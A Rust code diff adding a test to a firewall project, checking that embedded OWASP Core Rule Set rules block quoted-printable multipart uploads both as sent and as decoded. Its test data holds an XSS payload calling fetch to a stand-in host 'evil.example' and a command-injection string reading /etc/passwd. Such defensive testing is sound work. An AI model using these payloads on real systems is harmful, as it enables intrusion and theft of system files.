@@ -1879,6 +1879,64 @@ mod tests {
         uri
     }
 
+    /// One multipart field `f` with `headers` before its blank line, and `data`.
+    #[cfg(feature = "embed-crs")]
+    fn crs_field(headers: &str, data: &[u8]) -> Vec<u8> {
+        let mut body = format!("--b\r\nContent-Disposition: form-data; name=\"f\"\r\n{headers}\r\n").into_bytes();
+        body.extend_from_slice(data);
+        body.extend_from_slice(b"\r\n--b--\r\n");
+        body
+    }
+
+    /// CRS rule 922120 matches any part that names a transfer encoding, so a quoted-printable part scores it at
+    /// paranoia level 1 as it did before the engine decoded it, and the rules that read the text see it as it was sent
+    /// as well as decoded: with 922120 removed, a payload that decoding changes is still blocked.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_embedded_crs_blocks_a_quoted_printable_part_and_reads_it_as_sent_and_decoded() {
+        const QP: &str = "Content-Transfer-Encoding: quoted-printable\r\n";
+        // `=fe` is the byte 0xFE once decoded, so only the text as sent holds `onfocus=fetch(`.
+        const AS_SENT: &[u8] = b" autofocus onfocus=fetch('//evil.example') x=";
+        // Decoding turns the escapes into `;cat /etc/passwd`.
+        const ENCODED: &[u8] = b"=3Bcat=20/etc/passwd";
+
+        let generation = crs_generation(1);
+        assert_crs_blocked_by(&generation, 922_120, "/upload", MULTIPART, &crs_field(QP, b"hello"));
+        assert_crs_passes(&generation, "/upload", MULTIPART, &crs_field("", b"hello"));
+
+        let without_922120 = parse_generation(
+            &serde_json::json!({
+                "directives_map": {"crs": [
+                    "Include @recommended-conf",
+                    "SecRuleEngine On",
+                    "Include crs/crs-setup.conf",
+                    "Include crs/rules/*.conf",
+                    "SecRuleRemoveById 922120"
+                ]},
+                "default_directives": "crs"
+            })
+            .to_string(),
+        );
+        for (what, headers, data, rule) in [
+            ("the text as sent", QP, AS_SENT, 941_100),
+            (
+                "the text as sent, in a part that names no encoding",
+                "",
+                AS_SENT,
+                941_100,
+            ),
+            ("the decoded text", QP, ENCODED, 932_160),
+        ] {
+            let (interruption, matched) = crs_request(&without_922120, "/upload", MULTIPART, &crs_field(headers, data));
+            assert!(
+                matched.contains(&rule) && !matched.contains(&922_120),
+                "{what}: {rule} must match, matched {matched:?}"
+            );
+            assert_eq!(interruption, Some((949_110, 403)), "{what}");
+        }
+        assert_crs_passes(&without_922120, "/upload", MULTIPART, &crs_field(QP, b"hello=20world"));
+    }
+
     /// A multipart upload of one file named `filename`.
     #[cfg(feature = "embed-crs")]
     fn crs_upload(filename: &str) -> Vec<u8> {
